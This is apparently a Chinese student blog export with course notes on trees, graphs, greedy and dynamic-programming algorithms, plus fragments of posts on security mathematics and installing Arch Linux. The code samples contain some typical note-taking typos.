重要结论若二叉树中各结点的值均不相同，则：由二叉树的前序序列+中序序列，或由其后序序列+中序序列均能唯一地确定一棵二叉树，但由前序序列+后序序列却不一定能唯一地确定一棵二叉树。 应用计算结点总数 12345678int NodeCount(BiTree T)&#123; if(T==NULL) return 0; //如果是空树，则结点总数为0 else return 1 + NodeCount(T- &gt;lchild) + NodeCount(T-&gt;rchild);&#125; 计算叶子结点总数 1234567891011int LeafCount(BiTree T)&#123; if(T==NULL) return 0; //如果是空树，则叶子结点个数为0 else if(T-&gt;lchild==NULL&amp;&amp;T-&gt;rchild==NULL) return 1; //判断该结点是否是叶子结点（左孩子右孩子都为空），若是则返回1 else return LeafCount(T-&gt;lchild) + LeafCount(T-&gt;rchild);&#125; 计算树的高度 1234567891011int Height(BiTree T)&#123; if(T==NULL) return 0; //如果是空树，则高度为0 else &#123; int hl = Height(T&gt;lchild), int hr = Height(T-&gt;rchild); return (hl ≥ hr) ? (1 + hl): (1 + hr); &#125;&#125; 层次遍历算法 123456789101112131415void LayeredTraverse(BiTree T)&#123; cout&lt;&lt;T-&gt;data; //访问第v个顶点 InitQueue(Q); EnQueue(Q, T); //辅助队列Q初始化， T进队 while(!QueueEmpty(Q))&#123; //队列非空 DeQueue(Q, p); //队头元素出队并置为p if(p-&gt;lchild!=NULL)&#123; //p指向的结点有左孩子 cout&lt;&lt;p-&gt;lchild-&gt;data; EnQueue(Q, p-&gt;lchild); //左孩子进队 &#125;//if if(p-&gt;rchild!=NULL)&#123; //p指向的结点有右孩子 cout&lt;&lt;p-&gt;rchild-&gt;data; EnQueue(Q, p-&gt;rchild); //右孩子进队 &#125;//if &#125;//while &#125;//LayeredTraverse 线索二叉树LTag :若 LTag&#x3D;0, lchild域指向左孩子； 若 LTag=1, lchild域指向其前驱。 RTag :若 RTag&#x3D;0, rchild域指向右孩子； 若 RTag=1, rchild域指向其后继。 区分前驱后继分别为前序中序后序 线索：指向结点前驱和后继的指针线索链表：加上线索二叉链表线索二叉树：加上线索的二叉树（图形式样）线索化：对二叉树以某种次序遍历使其变为线索二叉树的过程 避免指针域悬空，让空域指向根结点 树的存储结构双亲表示法 123456789typedef struct PTNode&#123; DataType data; int parent;&#125; PTNode;typedef struct PTree&#123; PTNode nodes[MAXSIZE]; int r, n; //根的位置和结点数&#125; PTree; 孩子表示法 12345678910111213typedef struct CTNode&#123; int child; struct CTNode *next;&#125;CTNode;//孩子节点typedef struct CTBox&#123; DataType data; CTNode *firstchild;&#125;CTBox; //表头节点typedef struct CTree&#123; CTBox nodes[MAXSIZE]; int n,r;&#125; CTree; //树 双亲孩子表示法 孩子兄弟表示法1234typedef struct CSNode&#123; ElemType data; struct CSNode *firstchild,*nextsibling;&#125;CSNode,*CSTree; 树的存储结构——孩子兄弟表示法也称为二叉树表示法、二叉链表表示法 树和森林树、森林和二叉树的相互转换 二叉树的应用 二叉排序树二叉排序树或是空树，或是满足如下性质的二叉树： 若其左子树非空，则左子树上所有结点的值均小于根结点的值； 若其右子树非空，则右子树上所有结点的值均大于等于根结点的值； 其左右子树本身又各是一棵二叉排序树 二叉排序树的查找12345BSTree SearchBST(BSTree T, KeyType key) &#123; if((!T) || key==T-&gt;data.key) return T; else if (key&lt;T-&gt;data.key) return SearchBST(T-&gt;lchild,key); //在左子树中继续查找 else return SearchBST(T-&gt;rchild,key); //在右子树中继续查找&#125; // SearchBST 平均查找长度和二叉树的形态有关，即，最好：$\\log_2n$（形态匀称，与二分查找的判定树相似）最坏: $(n+1)&#x2F;2$（单支树） 二叉排序树的生成就不讲了，主要讲讲删除 二叉排序树的删除 平衡二叉树根结点的左、右子树深度之差的绝对值≤ 1左、右子树是平衡二叉树； 平衡因子:该结点左子树与右子树的高度差 对于一棵有n个结点的AVL树，其高度保持在$O(\\log_2n)$数量级，ASL也保持在$O(\\log_2n)$量级。 结点插入的平衡调整 结点删除的平衡调整 练习 判断平衡二叉树123456789101112131415161718typedef struct BiNode&#123; TElemType data; struct BiNode *lchild,*rchild; //左右孩子指针&#125;BiNode,*BiTree; bool isBalanced(BiTree T) bool isBalanced(BiTree T) &#123; return height(T) &gt;= 0; &#125; int dfs(TreeNode* root) &#123; if (T == null) &#123; return 0; &#125; // 记录左子树的高度 int left_height = dfs(T-&gt;lchild); // 记录右子树的高度 int right_height = dfs(T-&gt;rchild); if (abs(left_height - right_height) &gt; 1 || left_height == -1 || right_height == -1) &#123; return -1; &#125; return 1 + max(left_height, right_height); &#125; &#125; 霍夫曼树关键：要设计长度不等的编码，则必须使任一字符的编码都不是另一个字符的编码的前缀－前缀编码 一棵有n个叶子结点的Huffman树有 $2n-1$个结点 123456789101112131415161718192021222324252627typedef struct&#123; int weight; int parent,lch,rch;&#125; HuffmanNode, *HuffmanTree;算法void CreatHuffmanTree (HuffmanTree HT,int n)&#123;if(n&lt;=1)return;m=2*n-1;HT=new HTNode[m+1];//0号单元未用，HT[m]表示根结点 for(i=1;i&lt;=m;++i) &#123;HT[i].lch=0;HT[i].rch=0;HT[i].parent=0;&#125;for(i=1;i&lt;=n;++i)cin&gt;&gt;HT[i].weight; for( i=n+1;i&lt;=m;++i) //构造 Huffman树 &#123; Select(HT, i-1, &amp;s1, &amp;s2); //在HT[k](1≤k≤i-1)中选择两个其双亲域为0, // 且权值最小的结点, // 并返回它们在HT中的序号s1和s2 HT[s1].parent=i; HT[s2] .parent=i; //表示从F中删除s1,s2 HT[i].lch=s1; HT[i].rch=s2 ; //s1,s2分别作为i的左右孩子 HT[i].weight=HT[s1].weight + HT[s2].weight; //i 的权值为左右孩子权值之和 &#125;&#125; 生成霍夫曼编码 123456789101112131415161718void CreatHuffmanCode(HuffmanTree HT, HuffmanCode &amp;HC, int n)&#123;//从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中HC=new char *[n+1]; //分配n个字符编码的头指针矢量cd=new char [n]; //分配临时存放编码的动态数组空间cd[n-1]=’\\0’; //编码结束符for(i=1; i&lt;=n; ++i)&#123; //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0)&#123; //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 &#125; //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], &amp;cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 &#125; delete cd; //释放临时空间&#125; // CreatHuffanCode 图与贪心算法矩阵表示邻接矩阵表示12345678910//用两个数组分别存储顶点表和邻接矩阵#define MaxInt 32767 //表示极大值，即∞#define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct&#123; VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 &#125;AMGraph; 用邻接矩阵创建无向网络123456789101112131415161718192021222324Status CreateUDN(AMGraph &amp;G)&#123; //采用邻接矩阵表示法，创建无向网络G cin&gt;&gt;G.vexnum&gt;&gt;G.arcnum; //输入总顶点数，总边数 for(i = 0; i&lt;G.vexnum; ++i) cin&gt;&gt;G.vexs[i]; //依次输入点的信息 for(i = 0; i&lt;G.vexnum;++i) //初始化邻接矩阵，边的权值均置为极大值 for(j = 0; j&lt;G.vexnum;++j) G.arcs[i][j] = MaxInt; for(k = 0; k&lt;G.arcnum;++k)&#123; //构造邻接矩阵 cin&gt;&gt;v1&gt;&gt;v2&gt;&gt;w; //输入一条边依附的顶点及权值 i = LocateVex(G, v1); j = LocateVex(G, v2); //确定v1和v2在G中的位置 G.arcs[i][j] = w; //边&lt;v1, v2&gt;的权值置为w G.arcs[j][i] = G.arcs[i][j]; //置&lt;v1, v2&gt;的对称边&lt;v2, v1&gt;的权值为w &#125;//for return OK; &#125;//CreateUDN int LocateVex(MGraph G,VertexType u) &#123; /* 初始条件:图G存在,u和G中顶点有相同特征 */ /* 操作结果:若G中存在顶点u,则返回该顶点在图中位置;否则返回-1 */ int i; for(i=0;i&lt;G.vexnum;++i) if(u==G.vexs[i]) return i; return -1; &#125; 邻接表表示空间效率为O(n+2e)。若是稀疏图(e&lt;&lt;n2)，比邻接矩阵表示法O(n2)省空间 12345678910111213141516#define MVNum 100 //最大顶点数 typedef struct ArcNode&#123; //边结点 int adjvex; //该边所指向的顶点的位置 struct ArcNode * nextarc; //指向下一条边的指针 OtherInfo info; //和边相关的信息 &#125;ArcNode; -----------------------------------------------------typedef struct VNode&#123; VerTexType data; //顶点信息 ArcNode * firstarc; //指向第一条依附该顶点的边的指针 &#125;VNode; -----------------------------------------------------typedef struct&#123; VNode vertices[MVNum]; //邻接表 int vexnum, arcnum; //图的当前顶点数和边数 &#125;ALGraph; 利用邻接表创建无向网络123456789101112131415161718192021Status CreateUDG(ALGraph &amp;G)&#123; //采用邻接表表示法，创建无向图G cin&gt;&gt;G.vexnum&gt;&gt;G.arcnum; //输入总顶点数，总边数 for(i = 0; i&lt;G.vexnum; ++i)&#123; //输入各点，构造表头结点表 cin&gt;&gt; G.vertices[i].data; //输入顶点值 G.vertices[i].firstarc=NULL; //初始化表头结点的指针域为NULL &#125;//for for(k = 0; k&lt;G.arcnum;++k)&#123; //输入各边，构造邻接表 cin&gt;&gt;v1&gt;&gt;v2; //输入一条边依附的两个顶点 i = LocateVex(G, v1); j = LocateVex(G, v2); p1=new ArcNode; //生成一个新的边结点*p1 p1-&gt;adjvex=j; //邻接点序号为j p1-&gt;nextarc= G.vertices[i].firstarc; G.vertices[i].firstarc=p1; //将新结点*p1插入顶点vi的边表头部 p2=new ArcNode; //生成另一个对称的新的边结点*p2 p2-&gt;adjvex=i; //邻接点序号为i p2-&gt;nextarc= G.vertices[j].firstarc; G.vertices[j].firstarc=p2; //将新结点*p2插入顶点vj的边表头部 &#125;//for return OK; &#125;//CreateUDG 对于任一确定的无向图，邻接矩阵是唯一的（行列号与顶点编号一致），但邻接表不唯一（链接次序与顶点编号无关）。邻接矩阵的空间复杂度为O(n2),而邻接表的空间复杂度为O(n+e)。 用途：邻接矩阵多用于稠密图；而邻接表多用于稀疏图 十字链表表示法123456789101112typedef struct arcnode //边结点&#123; int tailvex, headvex; //弧尾、弧头在表头数组中位置 struct arcnode *hlink；//指向弧头相同的下一条弧 struct arcnode *tlink; //指向弧尾相同的下一条弧&#125;DGraphEdge;typedef struct dnode //顶点结点&#123; int data; //与顶点有关信息 struct arcnode *firstin；//指向以该顶点为弧头的第一个弧结点 struct arcnode *firstout; //指向以该顶点为弧尾的第一个弧结点&#125;DGraph;DGraph g[M]; //g[0]不用 十字链表(1) 用于表示有向图(2) 邻接表和逆邻接表的组合 邻接多重表表示法123456789101112typedef struct arcnode //边结点&#123; int mark; //标志域 int ivex, jvex; //该边依附的两个顶点在表头数组中位置 struct arcnode *ilink, *jlink; //分别指向依附于ivex和jvex的 下一条边&#125;NDGraphEdge;typedef struct dnode //顶点结点&#123; int data; //存与顶点有关的信息 struct arcnode *firstedge; //指向第一条依附于该顶点的边&#125;NDGraph;NDGraph G[M]; //G[0]不用 邻接多重表：(1) 用于表示无向图(2) 每条边只表示一次的邻接表 图的遍历DFS算法邻接矩阵 123456789101112void DFS(AMGraph G, int v)&#123; //图G为邻接矩阵类型 cout&lt;&lt;v; visited[v] = true; //访问第v个顶点 for(w = 0; w&lt; G.vexnum; w++) //依次检查邻接矩阵v所在的行 if((G.arcs[v][w]!=0)&amp;&amp; (!visited[w])) DFS(G, w); //w是v的邻接点，如果w未访问，则递归调用DFS &#125; typedef struct&#123; VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 &#125;AMGraph; 邻接表 1234567891011121314151617181920212223void DFS(ALGraph G, int v)&#123; //图G为邻接表类型 cout&lt;&lt;v; visited[v] = true; //访问第v个顶点 p= G.vertices[v].firstarc; //p指向v的边链表的第一个边结点 while(p!=NULL)&#123; //边结点非空 w=p-&gt;adjvex; //表示w是v的邻接点 if(!visited[w]) DFS(G, w);//如果w未访问，则递归调用DFS p=p-&gt;nextarc; //p指向下一个边结点 &#125; &#125; typedef struct ArcNode&#123; int adjvex; struct ArcNode * nextarc; OtherInfo info; &#125;ArcNode; typedef struct VNode&#123; VerTexType data; ArcNode * firstarc; &#125;VNode; typedef struct&#123; VNode vertices[MVNum]; int vexnum, arcnum; &#125;ALGraph; 效率分析用邻接矩阵来表示图，遍历图中每一个顶点都要从头扫描该顶点所在行，时间复杂度为O(n2)。用邻接表来表示图，需要访问n个头结点和2e 个表结点，时间复杂度为O(n+e)。 结论：稠密图适于在邻接矩阵上进行深度遍历；稀疏图适于在邻接表上进行深度遍历 BFS1234567891011121314void BFS (Graph G, int v)&#123; //按广度优先非递归遍历连通图G cout&lt;&lt;v; visited[v] = true; //访问第v个顶点 InitQueue(Q); //辅助队列Q初始化，置空 EnQueue(Q, v); //v进队 while(!QueueEmpty(Q))&#123; //队列非空 DeQueue(Q, u); //队头元素出队并置为u for(w = FirstAdjVex(G, u); w&gt;=0; w = NextAdjVex(G, u, w)) if(!visited[w])&#123; //w为u的尚未访问的邻接顶点 cout&lt;&lt;w; visited[w] = true; EnQueue(Q, w); //w进队 &#125;//if &#125;//while &#125;//BFS 效率分析如果使用邻接矩阵，则BFS对于每一个被访问到的顶点，都要循环检测矩阵中的整整一行（ n 个元素），总时间代价为O(n2)。用邻接表来表示图，需要访问 n个头结点和2e个表节点，时间复杂度为O(n+e)。 DFS和BFS效率比较空间复杂度相同，都是O(n)(借用了堆栈或队列）； 时间复杂度只与存储结构（邻接矩阵或邻接表）有关，而与搜索路径无关 AOV网和AOE网① AOV网(Activity On Vertices)—用顶点表示活动的网络② AOE网(Activity On Edges)—用边表示活动的网络 拓扑排序算法的实现以邻接表作存储结构把邻接表中所有入度为0的顶点进栈栈非空时，输出栈顶元素Vj并退栈；在邻接表中查找Vj的直接后继Vk，把Vk的入度减1；若Vk的入度为0则进栈重复上述操作直至栈空为止。若栈空时输出的顶点个数不是n，则有向图有环；否则，拓扑排序完毕 1234567891011121314151617181920212223242526272829303132typedef struct node&#123; int vex; struct node *next;&#125;GraphNode;typedef struct tnode&#123; int vexdata; int in; struct node *link;&#125;Graph;void toposort(Graph g[],int n)&#123; int top,m,k,j,s[M]; GraphNode *p; top=0; m=0; for(j=1;j&lt;=n;j++) if(g[j].in==0) s[top++]=j; while(top&gt;0) &#123; j=s[--top]; printf(&quot;%d &quot;,g[j].vexdata); m++; p=g[j].link; while(p!=NULL) &#123; k=p-&gt;vex; g[k].in--; if(g[k].in==0) s[top++]=k; p=p-&gt;next; &#125; &#125; printf(&quot;\\nm=%d\\n&quot;,m); if(m&lt;n) printf(&quot;The network has a cycle\\n&quot;);&#125; 关键路径AOE网(Activity On Edge)——也叫边表示活动的网。AOE网是一个带权的有向无环图，其中顶点表示事件，弧表示活动，权表示活动持续时间起点——表示整个工程的开始点，也称源点终点——表示整个工程的结束点，也称汇点路径长度——路径上各活动持续时间之和关键路径——起点到终点的最长路径Ve(j)——表示事件Vj的最早发生时间Vl(j)——表示事件Vj的最迟发生时间e(k)——表示活动ak的最早开始时间l(k)——表示活动ak的最迟开始时间l(k) – e(k)——表示完成活动ak的时间余量关键活动——关键路径上的活动，即l(k)&#x3D;e(k)的活动 123456789101112131415161718192021222324252627282930313233343536Status TopoLogicalOrder( Graph G, Stack &amp;T)&#123;//T 拓扑排序栈 FindInDegree(G, indegree); //求各的顶点的入度 Stack S; //入度为0 的顶点栈 InitStack(T); count=0; ve[0..G,vexnum-1]=0; while(!stackEmpty(S))&#123; Pop(S,j); Push(T,j);++count; for (p=G.vertices[j].firstarc; p; p=p-&gt;nextarc)&#123; k=p-&gt;adjvex; if(--indegree[k]==0)Push(S,k); if(ve[j]+*(p-&gt;info)&gt;ve[k]) ve[k]=ve[j]+*(p-&gt;info); &#125; &#125; if(count&lt;G.vexnum) return ERROR; else return OK;&#125;Status CriticalPath(Graph G)&#123; Stack T; if(!TopoLogicalOrder(G,T) return ERROR; //拓扑排序时已计算最早发生时间 vl[0..G.vexnum-1]=ve[G.vexnum-1]; //初始化最迟发生时间 while(!StackEmpty(T))&#123; for(Popo(T,j), p=G.vertices[j].firstarc; p; p=p-&gt;nextarc)&#123; k=p-&gt;adjvex; dut=*(p-&gt;info); //dut&lt;j,k&gt; if(vl[k]-dut&lt;vl[j]) vl[j]=vl[k]-dut &#125; &#125; for(j=0; j&lt;G.vexnum; ++j)&#123; for(p=G.vertices[j].firstarc; p; p=p-&gt;nextarc)&#123; k=p-&gt;adjvex; dut=*(p-&gt;info); ee=ve[j]; el=vl[k]-dut; tag=(ee==el)?&quot;*&quot;:&quot;&quot;; printf(j,k,dut,ee,el,tag); //输出关键活动 &#125; &#125;&#125; 贪心算法求解分数背包问题1234567891011121314151617181920public static float knapsack(float c, float [] w, float [] v, float [] x)&#123; int n=v.length; Element [] d = new Element [n]; for (int i = 0; i &lt; n; i++) d[i] = new Element(w[i],v[i],i); MergeSort.mergeSort(d); int i; float opt=0; for (i=0;i&lt;n;i++) x[i]=0; for (i=0;i&lt;n;i++) &#123; if (d[i].w&gt;c) break; x[d[i].i]=1; opt+=d[i].v; c-=d[i].w; &#125; if (i&lt;n)&#123; x[d[i].i]=c/d[i].w; opt+=x[d[i].i]*d[i].v; &#125; return opt;&#125; 对于0-1背包问题，贪心选择之所以不能得到最优解是因为在这种情况下，它无法保证最终能将背包装满，部分闲置的背包空间使每公斤背包空间的价值降低了。事实上，在考虑0-1背包问题时，应比较选择该物品和不选择该物品所导致的最终方案，然后再作出最好选择。由此就导出许多互相重叠的子问题。这正是该问题可用动态规划算法求解的另一重要特征。实际上也是如此，动态规划算法的确可以有效地解0-1背包问题。 求解活动安排问题1234567891011121314151617public static int greedySelector(int [] s, int [] f, boolean a[]) &#123; sort all the job in ascending order of finishing time, and relabel them. int n=s.length-1; a[1]=true; int j=1; int count=1; for (int i=2;i&lt;=n;i++) &#123; if (s[i]&gt;=f[j]) &#123; a[i]=true; j=i; count++; &#125;\\\\if else a[i]=false; &#125;\\\\for return count; &#125; 求解最小生成树Prime算法: 归并顶点，与边数无关，适于稠密网Kruskal算法：归并边，适于稀疏网 这个看图掌握一下吧。 效率分析 最短路径问题一、 单源最短路径—用Dijkstra（迪杰斯特拉）算法二、所有顶点间的最短路径—用Floyd（弗洛伊德）算法 迪杰斯特拉算法12345678910111213141516171819202122232425void ShortestPath_DIJ(AMGraph G, int v0)&#123; //用Dijkstra算法求有向网G的v0顶点到其余顶点的最短路径 n=G.vexnum; //n为G中顶点的个数 S[v0]=true; //将v0加入S D[v0]=0; //源点到源点的距离为0 for(v = 1; v&lt;n; ++v)&#123; //n个顶点依次初始化 S[v] = false; //S初始为空集 D[v] = G.arcs[v0][v]; //将v0到各个终点的最短路径长度初始化 if(D[v]&lt; MaxInt) Path [v]=v0; //v0和v之间有弧，将v的前驱置为v0 else Path [v]=-1; //如果v0和v之间无弧，则将v的前驱置为-1 &#125;//for /*―开始主循环，每次求得v0到某个顶点v的最短路径，将v加到S集―*/ for(i=1;i&lt;n; ++i)&#123; //对其余n−1个顶点，依次进行计算 min= MaxInt; for(w=0;w&lt;n; ++w) if(!S[w]&amp;&amp;D[w]&lt;min) &#123;v=w; min=D[w];&#125; //选择一条当前的最短路径，终点为v S[v]=true; //将v加入S for(w=0;w&lt;n; ++w) //更新从v0出发到集合V−S中顶点的最短路径长度 if(!S[w]&amp;&amp;(D[v]+G.arcs[v][w]&lt;D[w]))&#123; D[w]=D[v]+G.arcs[v][w]; //更新D[w] Path [w]=v; //更改w的前驱为v &#125;//if &#125;//for &#125;//ShortestPath_DIJ 弗洛伊德算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950采用图的邻接矩阵的存储结构 怎样构造一个图，在此不赘述，直接给出floyd-wallshall算法。void MDNet::Floyd(CDC *pDC)&#123; typedef vector&lt;int&gt; path;//使用顺序表模板 path p[max_vertex_num][max_vertex_num]; //p存放每对顶点之间的最短路径 int D[max_vertex_num][max_vertex_num]; // D存放每对顶点之间的最短路径值 int i,j,k; for(i=1;i&lt;=vex_num;i++) &#123;//初始化 for(j=1;j&lt;=vex_num;j++) &#123; p[i][j].push_back(i); p[i][j].push_back(j); //顶点i和顶点j之间的路径初始时就是ij。 D[i][j]=arcs[i][j];//路径值为边（i，j）的权值 &#125; &#125; for(k=1;k&lt;=vex_num;k++) &#123;//对于每一个顶点都要试探 for(i=1;i&lt;=vex_num;i++) &#123; for(j=1;j&lt;=vex_num;j++) &#123;//在顶点i和顶点j之间的路径上试探k if(i==j)continue;//对角线上的元素（即顶点自身之 //间）不予考虑 if(D[i][k]+D[k][j]&lt;D[i][j]) &#123;//发现更短的路径 D[i][j]=D[i][k]+D[k][j]; //新的i、j间的路径由两部分组成 //p[i][k]+p[k][j] p[i][j]=p[i][k] for(int m=1;m&lt;p[k][j].size();m++) p[i][j].push_back(p[k][j][m]); &#125; &#125; &#125; &#125;for(i=1;i&lt;=vex_num;i++) &#123;//打印每两个顶点之间的路径 for(j=1;j&lt;=vex_num;j++) &#123; for(k=0;k&lt;p[i][j].size();k++) cout&lt;&lt;p[i][j][k]&lt;&lt;&quot; &quot;; cout&lt;&lt;D[i][j]; cout&lt;&lt;endl; &#125; &#125;&#125; 算法全局最优解动态规划动态规划与分治递归的区别 共同点：递归子结构 将待求解问题分解成若干个规模较小的相同类型的子问题，先求解子问题，然后从这些子问题的解得到原问题的解。 不同点：重叠子问题 适合于用动态规划求解的问题，经分解得到子问题往往不是互相独立的。若用分治法来解这类问题，则分解得到的子问题数目太多，有些子问题被重复计算了很多次。 解决方案 保存所有已解的子问题的答案以备后用。 基本步骤 找出最优解的性质，并刻划其结构特征。 递归地定义最优值。 以自底向上的方式计算出最优值。 根据计算最优值时得到的信息，构造最优解。 带权重的活动安排问题不能使用贪心算法求解 p(j)为与活动j兼容的最大活动序号 分为两种情形，$v_j$表示第j个活动的权重 递归求解和动态规划求解对比 时间复杂度为$O(1.618^n)$ 因为如下图可算得$\\frac{1+\\sqrt{5}}{2}\\approx1.618$ 时间复杂度为$O(2n)$ 因为完成两次递归调用填充一个$M[n]$,一共填充$2n$次 时间复杂度为$O(n\\log_2n)$ 因为快速排序的时间复杂度是$O(n\\log_2n)$ 动态规划算法的基本要素 最优子结构 重叠子问题 矩阵连乘问题结构 矩阵乘法满足交换率，故矩阵连乘可能得到不同的结果 动态规划思路 得到递归的关系$$m[i,j]&#x3D;\\begin{cases}0&amp;&amp;&amp;&amp;&amp;&amp;&amp;i&#x3D;j\\min{m[i,j]+m[k+1,j]+p_{i-1}p_kp_j}&amp;&amp;&amp;&amp;&amp;&amp;&amp;i&lt;j\\end{cases}$$ 但是递归算法的许多子问题被计算了多次 动态规划算法123456789101112131415161718public static void matrixChain(int [] p, int [][] m, int [][] s) &#123; int n=p.length-1; for (int i = 1; i &lt;= n; i++) m[i][i] = 0; for (int r = 2; r &lt;= n; r++) \\\\ r 为矩阵链的长度 for (int i = 1; i &lt;= n - r+1; i++) &#123; \\\\ i 为首矩阵的序号 int j=i+r-1; \\\\ j 为尾矩阵的序号 m[i][j] = m[i+1][j]+ p[i-1]*p[i]*p[j]; \\\\ 首先尝试在矩阵 i 处分开 s[i][j] = i; for (int k = i+1; k &lt; j; k++) &#123; \\\\ 然后尝试在矩阵 k 处分开 int t = m[i][k] + m[k+1][j] + p[i-1]*p[k]*p[j]; if (t &lt; m[i][j]) &#123; m[i][j] = t; s[i][j] = k; &#125; &#125; &#125; &#125;&#125; 算法的时间空间复杂度算法复杂度分析： 算法matrixChain的主要计算量取决于算法中对r，i和k的3重循环。循环体内的计算量为$O(1)$，而3重循环的总次数为$O(n^3)$。因此算法的计算时间上界为$O(n^3)$。算法所占用的空间显然为$O(n^2)$。 0-1背包问题结构 贪心算法可能得不到最优解 正确和错误分析 添加一个w来记录重量限制即可 动态规划求解12345678910Input: n, w1,…,wN, v1,…,vNfor w = 0 to W M[0, w] = 0for i = 1 to n for w = 1 to W if (wi &gt; w) M[i, w] = M[i-1, w] else M[i, w] = max &#123;M[i-1, w], vi + M[i-1, w-wi ]&#125;return M[n, W] 时间复杂度时间复杂度为 $\\Theta(n W)$ 最长子序列 结构 递归结构 算法123456789101112131415Algorithm lcsLength(x,y,b)1: m&lt;-x.length;2: n&lt;-y.length;3: m[i][0]=0; m[0][i]=0;4: for (int i = 1; i &lt;= m; i++)5: for (int j = 1; j &lt;= n; j++) 6: if (x[i]==y[j]) 7: m[i][j]=m[i-1][j-1]+1;8: b[i][j]=1;9: else if (m[i-1][j]&gt;=m[i][j-1]) 10: m[i][j]=m[i-1][j];11: b[i][j]=2;12: else 13: m[i][j]=c[i][j-1];14: b[i][j]=3; 1234567891011构造最长公共子序列Algorithm lcs(int i,int j,char [] x,int [][] b) &#123; if (i ==0 || j==0) return; if (b[i][j]== 1)&#123; lcs(i-1,j-1,x,b); System.out.print(x[i]); &#125; else if (b[i][j]== 2) lcs(i-1,j,x,b); else lcs(i,j-1,x,b); &#125; 时间复杂度由于每个数组单元的计算耗费$O(1)$时间，算法LCSLength耗时$O(mn)$. 序列对齐概念 编辑距离 问题结构 动态规划算法 时间复杂度时间复杂度为$O(n^2)$ 参考： 董强老师ppt","categories":[{"name":"专业课学习笔记","slug":"专业课学习笔记","permalink":"https://foreon.github.io/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"大学课程学习","slug":"大学课程学习","permalink":"https://foreon.github.io/tags/%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"}]},{"title":"信息安全数学基础归纳","slug":"信息安全数学基础归纳","date":"2023-12-09T17:06:12.144Z","updated":"2023-12-09T17:12:31.827Z","comments":true,"path":"posts/43666.html","link":"","permalink":"https://foreon.github.io/posts/43666.html","excerpt":"","text":"前言期末在即，为了复习同时也为下学期的密码学打下基础，我把信息安全数学基础这门课归纳了一下，以供复习参考和记录。 多图预警！！！！ 所有内容来自许春香老师编著的《信息安全基础教程》 第一章 整除和同余 第二章 群 第三章 循环群与群的结构 群中元素的个数为群的阶，和元素的阶的概念不同，注意区分 要掌握“阶为素数的群一定为循环群”的证明 第四章 环 第六章 同余式 RSA 算法或许会考。。。。 掌握解密正确性的证明 例题看下这一题，巧用费马定理 第七章 平方剩余 第八章 原根和离散对数 Rabin密码体制和 ElGamal密码体制或许会考？？？还是了解即可吧","categories":[{"name":"专业课学习笔记","slug":"专业课学习笔记","permalink":"https://foreon.github.io/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"大学课程学习","slug":"大学课程学习","permalink":"https://foreon.github.io/tags/%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"}]},{"title":"安装Arch Linux的记录","slug":"安装Arch Linux的记录","date":"2023-12-02T18:03:57.000Z","updated":"2023-12-09T17:08:01.663Z","comments":true,"path":"posts/54882.html","link":"","permalink":"https://foreon.github.io/posts/54882.html","excerpt":"","text":"安装Arch Linux的记录第一次安装双系统，虽然是参考b站教程的，但还是很有成就感，故记录一下这个过程，顺便仔细学习一下各个命令的作用。 本文仅为学习记录，文末给出了参考来源，若有侵权请联系我删除🙏 安装过程准备工作 首先登录官网从国内镜像源下载arch linux系统镜像 下载rufus烧录arch linux镜像到U盘，默认设置就行 为arch linux分配磁盘空间，大概20G就够用 ​ 我这里能压缩的磁盘空间很少，但这个盘还剩很多空间，于是我使用了傲梅分区助手 设置网络重启进入bios,设置为从u盘启动，开始安装arch linux rfkill list查看列表 rfkill unblock wifi解除wifi锁定 ip link查看网卡，一般网卡名为wlan0 ip link set wlan0 up启用网卡 ip link set DEVICE { up | down | arp { on | off } | name NEWNAME | address LLADDR }选项说明：dev DEVICE：指定要操作的设备名up and down：启动或停用该设备arp on or arp off：启用或禁用该设备的arp协议name NAME：修改指定设备的名称，建议不要在该接口处于运行状态或已分配IP地址时重命名address LLADDRESS：设置指定接口的MAC地址 连接wifi 12345678910iwctl //在 Linux 中，&quot;ctl&quot; 通常代表 &quot;control&quot; 或 &quot;controller&quot;。例如，在 SysV 初始化系统中，/etc/init.d 目录下的脚本通常以 &quot;ctl&quot; 作为后缀，表示它们是用于控制系统服务的控制器。此外，在某些驱动程序中，CTL 可能代表 &quot;control&quot;，表示该驱动程序控制某个设备的操作。station wlan0 scan station wlan0 get-networks station wlan0 connect [wifi名字] //这里有个小技巧，如果遇到中文乱码，可以打出前面的非中文字符，再按下Tab匹配//接着输入密码exit ping baidu.com //检查网络是否正常 设置时间同步123timedatectl set-ntp true //开启ntp时间同步 timedatectl status 分配磁盘空间123fdisk -l //查看磁盘状态 fdisk /dev/nvme...n.... //nvme...n.... 由图为刚刚为arch linux分配空间的磁盘 1234567//p 查看布局//n 新建分区n7 //这里给出为linux的交换分区给出空间的磁盘的序号+4G //这里建立linux的交换分区，大小为4GBn//直接回车表示把剩余默认空间都给linux的根分区 UEFI是指主板的引导启动方式 GPT是硬盘的分区模式 EFI是GPT硬盘分区模式中的系统启动分区 EFI分区全称是EFI system partition，一般简写成EFI分区或者ESP分区 EFI分区是用来引导系统启动的 分配好的空间如图 分区格式化 创建好的分区必须格式化为一种文件系统，Linux 上常见的文件系统有 ext4，btrfs，xfs 等。建议第一次安装的读者使用 ext4 文件系统。btrfs 